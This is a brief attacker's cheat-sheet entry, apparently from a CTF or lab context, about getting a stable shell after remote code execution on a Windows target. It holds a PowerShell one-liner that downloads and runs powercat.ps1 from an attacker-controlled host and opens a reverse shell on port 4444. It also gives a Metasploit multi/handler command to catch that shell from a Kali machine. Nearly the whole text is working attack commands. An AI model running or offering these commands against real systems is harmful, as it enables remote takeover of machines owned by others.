powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://<LOCALIP>:8000/powercat.ps1');powercat -c <LOCALIP> -p 4444 -e powershell"

::Once we have achieve RCE on a target machine, we must stabilise the connection by executing a reverse shell with powercat and receiving the connection with Metasploit framework:

::In our kali machine, we run: msfconsole -x 'use multi/handler;set payload windows/x64/shell/reverse_tcp; set LHOST tun0; set LPORT 4444;run -j'

